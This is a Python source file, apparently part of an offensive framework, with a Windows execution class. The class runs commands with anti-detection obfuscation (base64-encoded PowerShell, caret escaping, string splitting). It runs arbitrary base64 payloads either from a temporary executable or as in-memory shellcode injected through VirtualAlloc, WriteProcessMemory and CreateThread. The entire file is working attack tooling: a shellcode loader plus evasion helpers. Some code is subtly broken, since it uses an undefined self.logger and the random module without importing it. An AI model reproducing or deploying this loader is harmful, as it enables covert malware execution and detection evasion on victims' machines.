import subprocess
import platform
import os
import base64
import tempfile
import logging
import re # For caret obfuscation
import stat # For chmod
import uuid
import shlex
import ctypes
from ctypes import wintypes
import win32con # Using constants from win32con
from typing import Dict, Any, List, Tuple, Optional
from datetime import datetime

logger = logging.getLogger(__name__)

class WindowsExecution:
    """Handles Windows-specific command and payload execution."""

    def __init__(self):
        self.config = { # Default config values, can be updated
            "execution_timeout": 120,
            "default_shell": "cmd"
        }
        self.handler_map = {
            "command": self._handle_command_execution,
            "payload": self._handle_payload_execution,
        }
        logger.info("Windows Execution handler initialized.")

    def update_config(self, config: Dict[str, Any]):
        """Update internal config specific to Windows execution."""
        self.config.update(config)

    def execute(self, exec_type: str, details: Dict[str, Any]) -> Dict[str, Any]:
        """Execute a specific Windows command or payload technique."""
        handler = self.handler_map.get(exec_type)
        if handler:
            logger.info(f"Executing Windows {exec_type} request.")
            try:
                result = handler(details)
                # Add common fields if not present?
                result["timestamp"] = datetime.now().isoformat()
                return result
            except Exception as e:
                logger.error(f"Error executing Windows {exec_type}: {e}", exc_info=True)
                return {"status": "failure", "type": exec_type, "reason": str(e)}
        else:
            logger.warning(f"Unsupported Windows execution type requested: {exec_type}")
            return {"status": "failure", "type": exec_type, "reason": f"Unsupported execution type '{exec_type}' for Windows"}

    # --- Internal Helper --- 
    def _run_command(self, command: str, shell: Optional[str], use_shell: bool, capture: bool = True) -> Tuple[int, str, str]:
        """Helper to run subprocess commands specifically for Windows."""
        timeout = self.config.get("execution_timeout", 120)
        effective_shell = shell or self.config.get("default_shell", "cmd")
        
        cmd_list_or_str = command # Default to passing string if use_shell=True
        if not use_shell:
            # Use shlex.split for robust parsing of commands with quotes/spaces
            try:
                 cmd_list_or_str = shlex.split(command, posix=False) # posix=False for Windows-style quoting
            except ValueError as e:
                 logger.warning(f"shlex.split failed for command '{command}': {e}. Falling back to basic split.")
                 cmd_list_or_str = command.split() # Fallback

        logger.info(f"Executing Windows command (shell={effective_shell if use_shell else 'None'}, use_shell={use_shell}): {command}")

        try:
            process = subprocess.run(cmd_list_or_str, 
                                     capture_output=capture, 
                                     text=True, 
                                     check=False, 
                                     timeout=timeout, 
                                     encoding='utf-8', 
                                     errors='ignore',
                                     shell=use_shell,
                                     # Windows specific flags if needed (e.g., CREATE_NO_WINDOW)
                                     # creationflags=subprocess.CREATE_NO_WINDOW
                                     )
            
            self.logger.debug(f"Command finished. RC: {process.returncode}")
            stdout = process.stdout if process.stdout else ""
            stderr = process.stderr if process.stderr else ""
            return process.returncode, stdout, stderr
        except FileNotFoundError:
            cmd_executed = cmd_list_or_str[0] if isinstance(cmd_list_or_str, list) else command.split()[0]
            logger.error(f"Command or shell not found: {cmd_executed}")
            raise FileNotFoundError(f"Required command/shell '{cmd_executed}' not found.")
        except subprocess.TimeoutExpired:
            logger.error(f"Command timed out after {timeout}s: {command}")
            raise TimeoutError(f"Command '{command}' timed out.")
        except Exception as e:
            logger.error(f"Unexpected error running command '{command}': {e}", exc_info=True)
            raise

    # --- Obfuscation Helper ---
    def _apply_obfuscation(self, command: str, method: str, obfuscation_type: Optional[str]) -> Tuple[str, Optional[str]]:
        """Applies Windows-relevant obfuscation techniques."""
        if not obfuscation_type:
            return command, None

        obfuscated_command = command
        applied_obfuscation = None
        logger.info(f"Applying Windows obfuscation type '{obfuscation_type}' for method '{method}'")

        if obfuscation_type == "base64":
            if method == "powershell":
                try:
                    encoded_cmd = base64.b64encode(command.encode('utf-16le')).decode('ascii')
                    obfuscated_command = encoded_cmd
                    applied_obfuscation = "base64_encoded_command"
                except Exception as e:
                    logger.warning(f"Base64 encoding for PowerShell failed: {e}. Using original command.")
            else:
                logger.warning("Base64 obfuscation only effective for PowerShell method on Windows.")

        elif obfuscation_type == "caret":
            if method == "cmd" or method == "direct": # Caret escaping primarily for CMD
                 special_chars = r"([&|<>\\(\\)\\@\\^%])"
                 try:
                      obfuscated_command = re.sub(special_chars, r"^\\1", command)
                      obfuscated_command = obfuscated_command.replace("^^", "^")
                      applied_obfuscation = "cmd_caret_escaping"
                 except Exception as e:
                      logger.warning(f"Caret obfuscation failed: {e}. Using original command.")
            else:
                 logger.warning("Caret obfuscation only effective for cmd/direct methods on Windows.")

        elif obfuscation_type == "string_concat":
            if method == "powershell": # Example for PowerShell
                try:
                    parts = command.split() # Simple split
                    obfuscated_parts = []
                    for part in parts:
                        if len(part) > 2:
                            split_point = random.randint(1, len(part) - 1)
                            p1 = part[:split_point]
                            p2 = part[split_point:]
                            obfuscated_parts.append(f"('{p1}'+'{p2}')")
                        else:
                            obfuscated_parts.append(part)
                    obfuscated_command = " ".join(obfuscated_parts)
                    applied_obfuscation = "string_concatenation"
                except Exception as e:
                    logger.warning(f"String concatenation obfuscation failed: {e}. Using original command.")
            else:
                 logger.warning("String concatenation example only implemented for PowerShell method.")

        # Add more obfuscation types here...
        else:
            logger.warning(f"Unsupported obfuscation type requested: '{obfuscation_type}'.")

        if applied_obfuscation:
             logger.info(f"Applied obfuscation '{applied_obfuscation}'. Preview: {obfuscated_command[:100]}...")
        return obfuscated_command, applied_obfuscation

    # --- Command Execution Handler ---
    def _handle_command_execution(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Execute a Windows shell command."""
        original_command = data.get("cmd")
        method = data.get("method", "direct") # direct, cmd, powershell
        obfuscation = data.get("obfuscation")
        use_system_shell = data.get("use_shell_api", False)
        capture_output = data.get("capture_output", True)

        if not original_command:
             raise ValueError("Missing 'cmd' in command execution data.")

        command_to_run, applied_obfuscation = self._apply_obfuscation(original_command, method, obfuscation)

        shell_to_use = None
        final_command_arg = command_to_run

        if method == "powershell":
            shell_executable = "powershell.exe"
            shell_to_use = shell_executable
            if applied_obfuscation == "base64_encoded_command":
                final_command_arg = [shell_executable, "-EncodedCommand", command_to_run]
                use_system_shell = False # Run executable directly
            else:
                ps_command_escaped = command_to_run.replace('"', '`"')
                final_command_arg = f'{shell_executable} -Command \"{ps_command_escaped}\"'
                use_system_shell = True # Use shell=True to interpret wrapper

        elif method == "cmd":
             shell_to_use = "cmd.exe"
             final_command_arg = f'cmd.exe /c "{command_to_run}"' # Wrap for cmd /c
             use_system_shell = True # Use shell=True for cmd /c

        elif method == "direct":
             shell_to_use = None
             final_command_arg = command_to_run
             use_system_shell = False
             if applied_obfuscation == "cmd_caret_escaping":
                  # Caret escaping needs cmd.exe implicitly
                  logger.debug("Caret obfuscation used with direct; executing via cmd.exe /c implicitly.")
                  final_command_arg = f'cmd.exe /c "{command_to_run}"'
                  use_system_shell = True
        else:
            logger.warning(f"Unknown Windows execution method '{method}', using direct.")
            final_command_arg = command_to_run
            use_system_shell = False

        details = {
            "original_command": original_command,
            "command_executed_arg": final_command_arg, # What was formed before _run_command
            "obfuscation_requested": obfuscation,
            "obfuscation_applied": applied_obfuscation,
            "execution_method": method,
            "used_system_shell_api": use_system_shell,
            "shell_invoked": shell_to_use,
            "captured_output": capture_output,
            "return_code": -1, "stdout": "", "stderr": ""
        }

        try:
            rc, stdout, stderr = self._run_command(
                final_command_arg if isinstance(final_command_arg, str) else " ".join(final_command_arg),
                shell=shell_to_use, # Shell executable (e.g., powershell.exe), not just name
                use_shell=use_system_shell,
                capture=capture_output
            )
            details["return_code"] = rc
            details["stdout"] = stdout
            details["stderr"] = stderr
            status = "success" if rc == 0 else "failure"
            reason = f"Command failed with return code {rc}." if status == "failure" else "Command executed successfully."

        except Exception as e:
            logger.error(f"_run_command failed for '{original_command}': {e}", exc_info=True)
            status = "failure"
            reason = f"Execution failed: {e}"
            details["stderr"] = reason # Put exception in stderr

        return {
            "status": status,
            "reason": reason,
            "technique": "command_execution",
            "details": details
        }

    # --- Payload Execution Handler ---
    def _handle_payload_execution(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Handles Windows payload execution via disk or memory."""
        content_b64 = data.get("content_b64")
        method = data.get("method") # disk, memory
        file_extension = data.get("file_extension", ".exe") # Default to exe on windows
        args = data.get("args", [])
        wait_timeout_ms = data.get("wait_timeout_ms", 5000) # Timeout for waiting on memory thread

        if not content_b64 or not method:
            return {"status": "failure", "reason": "Missing content_b64 or method for payload execution."}

        try:
            payload_bytes = base64.b64decode(content_b64)
        except Exception as e:
            return {"status": "failure", "reason": f"Base64 decode error: {e}"}

        status = "failure"
        reason = f"Method '{method}' not implemented or failed."
        result_details = {
            "execution_method": method,
            "payload_size_bytes": len(payload_bytes),
            "args_provided": args, # Note: Args typically not directly usable for shellcode injection
        }
        if method == "memory":
             result_details["wait_timeout_ms"] = wait_timeout_ms

        if method == "disk":
            temp_file_path = None
            try:
                temp_dir = tempfile.gettempdir()
                temp_file_name = f"bf_{uuid.uuid4().hex}{file_extension}"
                temp_file_path = os.path.join(temp_dir, temp_file_name)

                with open(temp_file_path, 'wb') as tmp_file:
                    tmp_file.write(payload_bytes)
                logger.info(f"Payload written to temporary file: {temp_file_path}")

                command_parts = [temp_file_path] + args
                command_str = " ".join(f'"{part}"' for part in command_parts)

                return_code, stdout, stderr = self._run_command(command_str, shell=None, use_shell=False, capture=True)

                result_details["temp_file_path"] = temp_file_path
                result_details["command_executed"] = command_str
                result_details["return_code"] = return_code
                result_details["stdout"] = stdout
                result_details["stderr"] = stderr

                if return_code == 0:
                    status = "success"
                    reason = "Payload executed successfully from disk."
                else:
                    reason = f"Payload execution from disk failed. RC: {return_code}. Stderr: {stderr[:200]}..."

            except Exception as e:
                reason = f"Error during disk payload execution: {e}"
            finally:
                if temp_file_path and os.path.exists(temp_file_path):
                    try:
                        os.remove(temp_file_path)
                        logger.info(f"Cleaned up temporary payload file: {temp_file_path}")
                    except Exception as e_clean:
                        logger.warning(f"Failed to cleanup temporary file {temp_file_path}: {e_clean}")

        elif method == "memory":
            self.logger.info(f"Attempting memory execution (shellcode injection) for {len(payload_bytes)} bytes.")
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            allocated_mem = None
            thread_handle = None

            try:
                # 1. Allocate memory
                MEM_COMMIT = 0x1000
                MEM_RESERVE = 0x2000
                PAGE_EXECUTE_READWRITE = 0x40
                payload_len = len(payload_bytes)

                kernel32.VirtualAlloc.restype = wintypes.LPVOID
                kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
                allocated_mem = kernel32.VirtualAlloc(None, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

                if not allocated_mem:
                    error_code = ctypes.get_last_error()
                    raise OSError(f"VirtualAlloc failed with error code {error_code}: {ctypes.WinError(error_code)[1]}")
                
                logger.debug(f"Allocated executable memory at address: {allocated_mem:#0x}")
                result_details["memory_address"] = f"{allocated_mem:#0x}"

                # 2. Copy shellcode to allocated memory
                # Create buffer from python bytes
                shellcode_buffer = (ctypes.c_char * payload_len).from_buffer_copy(payload_bytes)
                bytes_written = ctypes.c_size_t(0)
                # Using WriteProcessMemory on current process handle (-1)
                kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
                current_process = -1 # Pseudo handle for current process
                if not kernel32.WriteProcessMemory(current_process, allocated_mem, shellcode_buffer, payload_len, ctypes.byref(bytes_written)):
                    error_code = ctypes.get_last_error()
                    raise OSError(f"WriteProcessMemory failed with error code {error_code}: {ctypes.WinError(error_code)[1]}")
                
                if bytes_written.value != payload_len:
                     raise MemoryError(f"Failed to write entire shellcode. Wrote {bytes_written.value}/{payload_len} bytes.")
                
                logger.debug(f"Copied {bytes_written.value} bytes of shellcode to allocated memory.")

                # 3. Create thread to execute shellcode
                thread_id = wintypes.DWORD(0)
                kernel32.CreateThread.restype = wintypes.HANDLE
                kernel32.CreateThread.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD]
                thread_handle = kernel32.CreateThread(None, 0, allocated_mem, None, 0, ctypes.byref(thread_id))

                if not thread_handle:
                    error_code = ctypes.get_last_error()
                    raise OSError(f"CreateThread failed with error code {error_code}: {ctypes.WinError(error_code)[1]}")
                
                result_details["thread_id"] = thread_id.value
                logger.info(f"Created thread (ID: {thread_id.value}) to execute shellcode at {allocated_mem:#0x}.")

                # 4. Wait for thread to finish (optional)
                if wait_timeout_ms > 0:
                    logger.debug(f"Waiting for thread {thread_id.value} to complete (timeout: {wait_timeout_ms}ms)...")
                    kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
                    wait_result = kernel32.WaitForSingleObject(thread_handle, wait_timeout_ms)
                    result_details["wait_result"] = wait_result # 0=Signaled, 258=TIMEOUT
                    if wait_result == 0:
                         logger.info(f"Thread {thread_id.value} completed.")
                         status = "success"
                         reason = "Shellcode executed successfully via CreateThread."
                    elif wait_result == win32con.WAIT_TIMEOUT: # Use constant
                         logger.warning(f"Wait for thread {thread_id.value} timed out after {wait_timeout_ms}ms.")
                         status = "success" # Consider timeout as success for long-running shellcode
                         reason = f"Shellcode thread created, but wait timed out after {wait_timeout_ms}ms."
                    else:
                         logger.error(f"WaitForSingleObject returned unexpected status: {wait_result}")
                         reason = f"Wait for thread failed with status {wait_result}."
                else:
                    status = "success"
                    reason = "Shellcode thread created successfully (no wait requested)."
                    logger.info(reason)

            except (OSError, MemoryError) as e:
                reason = f"Memory execution failed: {e}"
                logger.error(reason, exc_info=True)
                status = "failure"
            except Exception as e:
                reason = f"Unexpected error during memory execution: {e}"
                logger.error(reason, exc_info=True)
                status = "failure"
            finally:
                # 5. Cleanup
                if thread_handle:
                    kernel32.CloseHandle(thread_handle)
                    logger.debug("Closed thread handle.")
                if allocated_mem:
                    MEM_RELEASE = 0x8000
                    kernel32.VirtualFree.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD]
                    if kernel32.VirtualFree(allocated_mem, 0, MEM_RELEASE):
                         logger.debug(f"Freed allocated memory at {allocated_mem:#0x}.")
                    else:
                         error_code = ctypes.get_last_error()
                         logger.warning(f"VirtualFree failed for address {allocated_mem:#0x}. Error code: {error_code}: {ctypes.WinError(error_code)[1]}")
                         if reason: reason += " | Warning: Failed to free memory."

        else:
             reason = f"Unsupported payload execution method: {method}"
             status = "failure"

        return {
            "status": status,
            "reason": reason,
            "technique": f"payload_execution_{method}",
            "details": result_details
        } 